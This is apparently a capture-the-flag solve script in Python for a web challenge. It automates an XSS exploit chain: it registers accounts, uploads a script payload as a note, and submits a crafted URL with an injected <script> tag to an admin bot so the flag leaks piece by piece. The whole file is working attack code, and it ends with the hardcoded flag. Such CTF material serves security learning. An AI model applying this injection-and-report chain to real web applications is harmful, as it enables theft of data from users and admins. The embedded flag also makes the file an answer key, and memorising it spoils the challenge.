import time
import requests
URL = "http://128.199.204.83:1339/"
INTERNAL_URL = "http://chall:8000/"

import string
import random
rng = lambda x: ''.join(random.choices(string.ascii_letters + string.digits, k=x))

done = False
flag = 'LNC24{'
while not done:
    s = requests.session()
    username = rng(16)
    password = "pwd"

    print(f"Registering dummy account ({username=})")
    while True:
        try:
            r = s.post(f"{URL}register", data={
                "username": username,
                "password": password
            }, timeout=5)
            if r.text == "Successfully created account":
                break
        except requests.exceptions.Timeout:
            pass
        # rate limited, slow down
        time.sleep(5)

    r = s.post(f"{URL}users/login", data={
        "username": username,
        "password": password
    })

    with open("payload.min.js", "r") as f:
        payload = f.read(-1)
    payload = payload.replace(r"{USERNAME}", username).replace(r"{PREFIX}", flag).replace(r"{PASSWORD}", password)

    r = s.post(f"{URL}users/upload_note", data={
        "contents": payload,
    })

    print("Reporting note")
    while True:
        try:
            r = s.post(f"{URL}report_note", data={
                "url": f'{INTERNAL_URL}?err_msg=<script src="{INTERNAL_URL}note?id=0%26username={username}"></script>'
            }, timeout=5)
            if r.text == "Report sent.":
                break
        except requests.exceptions.Timeout:
            pass
        time.sleep(5)

    while True:
        r = s.get(f"{URL}note?id=1&username={username}")
        if r.text != "No such note":
            flag = r.text
            print(f"XSS triggered. Current leak: {flag}")
            break
        time.sleep(1)
    
    if flag.endswith("}"):
        break

print(f"Flag: {flag}")
assert flag == "LNC24{leek_8fc7253e5d7c633e}"